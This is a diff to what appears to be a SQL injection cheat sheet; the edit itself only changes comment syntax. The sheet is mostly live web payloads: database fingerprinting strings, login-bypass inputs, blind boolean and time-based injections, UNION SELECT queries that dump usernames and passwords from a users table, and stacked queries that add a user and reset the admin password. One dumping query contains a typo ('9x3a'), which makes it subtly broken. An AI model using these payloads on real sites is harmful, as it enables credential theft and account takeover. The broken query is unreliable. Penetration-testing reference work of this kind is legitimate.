@@ -194,78 +194,78 @@ Confirm vulnerability: `http://targetsite.com/price.php?id=2   ->   http://targe
 
 DB fingerprinting techniques:
 ```
-MySQL                                                              // FINGERPRINTING:        
+--MySQL                                                              // FINGERPRINTING:        
    http://www.example.com/news.php?id=1 /*! AND 1=1 */--           // via. comments
    http://www.example.com/news.php?id=1 AND 'aa'=CONCAT('a','a')   // via. MySQL CONCAT()
    http://www.example.com/news.php?id=1 AND 1=2 UNION SELECT 1, 2, @@version  // via. db version
 
-Postgres
+--Postgres
    http://www.example.com/news.php?id=1 AND 1=1::int               // via. typecast
    http://www.example.com/news.php? id=1 AND 'a'='a'||'a'          // via. Postgres concat
    http://www.example.com/news.php? id=1
    SELECT version()                                                // via. db version
 
-If !MySQL and !Postgres, most likely SQLite:
+--If !MySQL and !Postgres, most likely SQLite:
    http://www.sqlitetutorial.net/sqlite-cheat-sheet   OR
    https://d17h27t6h515a5.cloudfront.net/topher/2016/September/57ed880e_sql-sqlite-commands-cheat-sheet/sql-sqlite-commands-cheat-sheet.pdf
 ```
 
 Enumerate DB metadata via. views:
 ```
-MySQL (db.information_schema)
+--MySQL (db.information_schema)
   SELECT * FROM INFORMATION_SCHEMA.PROCESSLIST;
   SELECT * FROM INFORMATION_SCHEMA.TABLES;
   
-Sqlite (db.sqlite_master)
+--Sqlite (db.sqlite_master)
   SELECT name FROM sqlite_master WHERE type='table';
 ```
 
 Authentication Bypass:
-```
-Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
+```sql
+-- Auth Form Bypass Example: SELECT * FROM Users WHERE user_id=’’ OR 1=1; /* ‘ AND password= ‘ */ — ‘
   [user_field]’ OR 1=1; /*
   [pass_field]*/--
   
-Other things try:
+-- Other things try:
   admin' --
   ' or 1=1--
   ' or '1'='1
   ' or '1'='1 --
 ```
 
-```
 Blind SQLi (Boolean / Time-based)
-    %' AND 1=1 AND '%'='                  // BOOLEAN: TRUE
-    %' AND 1=0 AND '%'='                  // BOOLEAN: FALSE
-    company=sap%' AND SLEEP(5) AND '%'='  // TIME-BASED   
-    page.asp?id=1 or 1=1 -- true
-    page.asp?id=1' or 1=1 -- true
-    page.asp?id=1" or 1=1 -- true
-    page.asp?id=1 and 1=2 -- false
+```sql
+%' AND 1=1 AND '%'='                  -- BOOLEAN: TRUE
+%' AND 1=0 AND '%'='                  -- BOOLEAN: FALSE
+company=sap%' AND SLEEP(5) AND '%'='  -- TIME-BASED   
+page.asp?id=1 or 1=1 -- true
+page.asp?id=1' or 1=1 -- true
+page.asp?id=1" or 1=1 -- true
+page.asp?id=1 and 1=2 -- false
 ```
 
 UNION SELECT (exfiltrating data):
-```
+```sql
 ns.agency/stuff.php?id=3 order by 1                                  
 ns.agency/stuff.php?id=0' union select 1,version(),database()--    // (MySQL) version + db name
 
-Dump usernames and passwords (MySQL)
-    // list names of tables within the current database [result=emails, referers, uagents, users]
+-- Dump usernames and passwords (MySQL)
+    -- list names of tables within the current database [result=emails, referers, uagents, users]
     ns.agency/stuff.php?id=0' union select 1,group_concat(table_name),database() from information_schema.tables where table_schema=database()--
-    // list names of columns within the "users" table [result=id, username, password]
+    -- list names of columns within the "users" table [result=id, username, password]
     ns.agency/stuff.php?id=0' union select 1,group_concat(column_name),database() from information_schema.columns where table_schema=database() and table_name="users"--
-    // list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
+    -- list id:user:password values within the "users" table [result=id, username, password] [result=1:admin:admin]
     ns.agency/stuff.php?id=0' union select 1,group_concat(id,9x3a,username,0x3a,password,0x3a),database() from users--
 ```
 
 INSERT / UPDATE (adding or changing data):
-```
-Insert new users (MySQL)
-    // insert a new row into the "users" table with values id=99, username=newuser, password=newpass
+```sql
+-- Insert new users (MySQL)
+    -- insert a new row into the "users" table with values id=99, username=newuser, password=newpass
     ns.agency/stuff.php?id=0'; insert into users(id,username,password) values ('99','newuser','newpass');--
 
-Update admin password (MySQL)
-    // set password="1234" for a user called "admin"
+-- Update admin password (MySQL)
+    -- set password="1234" for a user called "admin"
     ns.agency/stuff.php?id=0'; update users set password="1234" where username="admin";--
 ```
 
